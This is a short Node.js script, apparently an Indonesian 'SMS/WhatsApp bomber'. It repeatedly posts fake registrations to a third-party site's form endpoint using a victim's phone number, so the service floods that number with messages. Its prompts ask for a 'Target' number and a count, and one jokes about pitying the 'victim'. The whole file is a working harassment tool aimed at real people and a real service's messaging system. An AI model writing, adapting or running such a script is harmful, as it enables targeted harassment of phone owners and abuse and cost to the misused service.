const { randomInt } = require('crypto');
const https = require('https');
const readline = require('readline');
const delay = ms => new Promise((resolve) => setTimeout(resolve, ms))
const rl = readline.createInterface({
	input: process.stdin,
	output: process.stdout
});

function question(theQuestion) {
	return new Promise(resolve => rl.question(theQuestion, answ => resolve(answ)))
}

async function Spam(nomor) {
	const postData = {
		'idg': '',
		idgod: randomInt(9999),
		namaLengkap: 'bang+jago',
		kotaLahir: 'sleman',
		tglLahir: `${randomInt(27)}/${randomInt(12)}/2001`,
		noHp: nomor,
		privacyPolicy1: 'on',
	}

	const res = await post('https://sweb-mi.com/registration/axWA.php', postData)
	return res
}

async function post(url, data) {
	const dataString = Object.entries(data).map(x => `${x[0]}=${x[1]}`).join('&')

	const options = {
		method: 'POST',
		headers: {
			'Content-Type': 'application/x-www-form-urlencoded',
		},
	}

	return new Promise((resolve, reject) => {
		const req = https.request(url, options, (res) => {
			if (res.statusCode < 200 || res.statusCode > 299) {
				return reject(new Error(`HTTP status code ${res.statusCode}`))
			}

			const body = []
			res.on('data', (chunk) => body.push(chunk))
			res.on('end', () => {
				const resString = Buffer.concat(body).toString()
				resolve({
					status: res.statusCode,
					data: resString
				})
				// process.exit()
			})
		})

		req.on('error', (err) => {
			reject(err)
		})

		req.on('timeout', () => {
			req.destroy()
			reject(new Error('Request time out'))
		})

		req.write(dataString)
		req.end()
	})
}

(async () => {
	const target = await question('Target [diawali dengan 62] : ')
	const jmlah = await question('Mau berapa? [jangan terlalu banyak, kasihan korban] : ')

	let i = 0
	while (i < jmlah) {
		await delay(500)
		Spam(target).then(async res => {
			console.log('status code :', res.status, res.data, '|', 'no.', i + 1)
			if (res) {
				i++
			}
		})
		if (i == jmlah) {
			process.exit()
		}
	}
})()
